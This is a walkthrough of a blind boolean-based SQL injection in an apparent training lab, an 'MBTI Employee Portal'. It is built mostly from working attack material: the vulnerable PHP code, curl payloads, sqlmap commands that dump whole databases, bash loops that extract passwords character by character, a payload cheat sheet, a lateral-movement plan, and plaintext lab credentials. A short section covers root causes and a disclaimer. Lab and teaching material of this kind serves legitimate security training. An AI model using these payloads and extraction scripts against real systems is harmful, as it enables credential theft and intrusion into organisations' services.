# Blind SQL Injection Guide - MBTI Employee Portal

## 🎯 Vulnerability Location

**Endpoint:** `http://portal.mbti.local/api/search.php?q=<payload>`  
**Page:** Team Members search feature  
**Type:** Blind Boolean-based SQL Injection  
**Authentication:** Required (must be logged in)  
**Target Database:** `dev_environment` (contains Gitea and dev service credentials)

---

## 🔍 Vulnerability Details

### Vulnerable Code (search.php)
```php
$search = $_GET['q'];

// Queries dev_environment database containing Gitea credentials!
$query = "SELECT COUNT(*) as count FROM dev_environment.dev_credentials WHERE 
          service_name LIKE '%$search%' OR 
          username LIKE '%$search%' OR 
          access_level LIKE '%$search%' OR 
          notes LIKE '%$search%'";

$result = $conn->query($query);
$row = $result->fetch_assoc();
$count = $row['count'];

if ($count > 0) {
    echo json_encode(['success' => true, 'found' => true]);
} else {
    echo json_encode(['success' => true, 'found' => false]);
}
```

### 🎯 What You Can Extract:
- **Database:** `dev_environment`
- **Tables:** `dev_credentials`, `dev_servers`, `dev_access` (view)
- **Gitea Credentials:** admin, developer, peter.schneider accounts
- **Additional Services:** Jenkins, MySQL, Redis credentials
- **Access to:** `dev.mbti.local` Gitea instance (port 3000)

### Why It's Blind?
- ✅ No error messages exposed (SQL errors suppressed)
- ✅ Only returns boolean result: `"found": true` or `"found": false`
- ✅ No actual data from database is returned
- ✅ Requires inference techniques to extract data

---

## 🔬 Manual Testing

### 1. Basic True/False Test
```bash
# Test TRUE condition (should return "found": true)
curl -H "Cookie: PHPSESSID=<your-session>" \
  "http://portal.mbti.local/api/search.php?q=Gitea' OR '1'='1"

# Test FALSE condition (should return "found": false)
curl -H "Cookie: PHPSESSID=<your-session>" \
  "http://portal.mbti.local/api/search.php?q=Gitea' OR '1'='2"
```

### 2. Confirm Target Database
```bash
# Check if dev_environment database exists
curl -H "Cookie: PHPSESSID=<your-session>" \
  "http://portal.mbti.local/api/search.php?q=test' OR (SELECT COUNT(*) FROM information_schema.schemata WHERE schema_name='dev_environment')>0-- -"
```

### 3. Extract Gitea Admin Username
```bash
# Test if username contains 'admin'
curl -H "Cookie: PHPSESSID=<your-session>" \
  "http://portal.mbti.local/api/search.php?q=test' OR (SELECT username FROM dev_environment.dev_credentials WHERE service_name='Gitea' LIMIT 1) LIKE 'admin%'-- -"
```

### 4. Extract Gitea Admin Password (Character by Character)
```bash
# Extract first character of admin password
curl -H "Cookie: PHPSESSID=<your-session>" \
  "http://portal.mbti.local/api/search.php?q=test' AND SUBSTRING((SELECT password FROM dev_environment.dev_credentials WHERE username='admin'),1,1)='M'-- -"
```

---

## 🤖 Automated Exploitation with SQLMap

### 1. Basic SQLMap Test
```bash
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=<your-session-id>" \
  --batch \
  --level=3 \
  --risk=2
```

### 2. Enumerate Databases
```bash
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=<your-session-id>" \
  --dbs \
  --batch
```

### 3. Enumerate Tables in dev_environment
```bash
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=<your-session-id>" \
  -D dev_environment \
  --tables \
  --batch
```

### 4. Dump Gitea Credentials
```bash
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=<your-session-id>" \
  -D dev_environment \
  -T dev_credentials \
  --dump \
  --batch
```

### 5. Dump All Dev Environment Data
```bash
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=<your-session-id>" \
  -D dev_environment \
  --dump-all \
  --batch \
  --threads=5
```

---

## 🎯 Specific Attack Scenarios

### Scenario 1: Extract Gitea Admin Credentials
```bash
# Boolean-based extraction of password
# Expected result: MBTIGit2024!Admin
for i in {1..20}; do
  for char in {A..Z} {a..z} {0..9} '!' '@' '#'; do
    response=$(curl -s -H "Cookie: PHPSESSID=<session>" \
      "http://portal.mbti.local/api/search.php?q=test' AND SUBSTRING((SELECT password FROM dev_environment.dev_credentials WHERE username='admin'),${i},1)='${char}'-- -")
    echo "$response" | grep -q '"found":true' && echo -n "$char" && break
  done
done
echo
```

### Scenario 2: List All Available Services
```bash
# Count number of services
for i in {1..10}; do
  response=$(curl -s -H "Cookie: PHPSESSID=<session>" \
    "http://portal.mbti.local/api/search.php?q=test' AND (SELECT COUNT(DISTINCT service_name) FROM dev_environment.dev_credentials)=$i-- -")
  echo "$response" | grep '"found":true' && echo "Total services: $i" && break
done
```

### Scenario 3: Find Development Usernames
```bash
# Extract all usernames from dev_credentials
sqlmap -u "http://portal.mbti.local/api/search.php?q=test" \
  --cookie="PHPSESSID=<session>" \
  -D dev_environment \
  -T dev_credentials \
  -C username,password,service_name \
  --dump \
  --batch
```

---

## 💉 Payload Cheat Sheet

### Database & Table Discovery
```sql
# Find database name
' AND DATABASE()='dev_environment'-- -

# Count tables in dev_environment
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='dev_environment')>0-- -

# Check if dev_credentials table exists
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='dev_environment' AND table_name='dev_credentials')=1-- -
```

### Credential Extraction Payloads
```sql
# Count total credentials
' AND (SELECT COUNT(*) FROM dev_environment.dev_credentials)>5-- -

# Extract Gitea admin username
' AND (SELECT username FROM dev_environment.dev_credentials WHERE service_name='Gitea' LIMIT 1)='admin'-- -

# Extract Gitea admin password (first char)
' AND SUBSTRING((SELECT password FROM dev_environment.dev_credentials WHERE username='admin'),1,1)='M'-- -

# Check for specific service
' AND (SELECT COUNT(*) FROM dev_environment.dev_credentials WHERE service_name='Gitea')>0-- -

# Extract developer account password
' AND SUBSTRING((SELECT password FROM dev_environment.dev_credentials WHERE username='developer'),1,1)='D'-- -
```

### Service Discovery Payloads
```sql
# Find Gitea hostname
' AND (SELECT hostname FROM dev_environment.dev_servers WHERE service_type='gitea')='dev.mbti.local'-- -

# Find Gitea port
' AND (SELECT port FROM dev_environment.dev_servers WHERE service_type='gitea')=3000-- -

# Check service status
' AND (SELECT status FROM dev_environment.dev_servers WHERE service_type='gitea')='active'-- -
```

---

## 🎓 Attack Chain After SQLi

1. **Extract Gitea Credentials** via Blind SQLi
   - Admin: `admin:MBTIGit2024!Admin`
   - Developer: `developer:DevGit@MBTI2024`
   - Peter: `peter.schneider:GitAccess!2024`

2. **Access Gitea** at `http://dev.mbti.local:3000`
   - Login with extracted credentials
   - Browse repositories
   - Look for sensitive data, API keys, credentials

3. **Potential Findings in Gitea:**
   - SSH keys
   - API tokens
   - Configuration files with credentials
   - Deployment scripts
   - Database connection strings

4. **Lateral Movement:**
   - Use found credentials for SSH access
   - Access other services (Jenkins, MySQL, Redis)
   - Escalate privileges

---

## 🛡️ Why This Vulnerability Exists

1. **No Input Validation**: User input from `$_GET['q']` directly concatenated into SQL
2. **No Prepared Statements**: Using string concatenation instead of parameterized queries
3. **Cross-Database Access**: Application has access to sensitive dev_environment database
4. **Credentials in Database**: Plain-text passwords stored in database (bad practice)

---

## 📚 Expected Credentials to Extract

```
Service: Gitea
├── admin / MBTIGit2024!Admin (administrator)
├── developer / DevGit@MBTI2024 (developer)
└── peter.schneider / GitAccess!2024 (developer)

Service: Jenkins
└── jenkins-admin / JenkinsMBTI!2024 (administrator)

Service: MySQL Dev
└── dev_admin / DevDB@2024MBTI (administrator)

Service: Redis
└── redis-user / RedisDev2024! (read-write)
```

---

## ⚠️ Disclaimer

This is a **training environment**. SQL injection is **illegal** on real systems without authorization. Use this knowledge for:
- ✅ Authorized penetration testing
- ✅ Bug bounty programs
- ✅ Security research
- ✅ Educational purposes

**Never exploit vulnerabilities without explicit permission!**
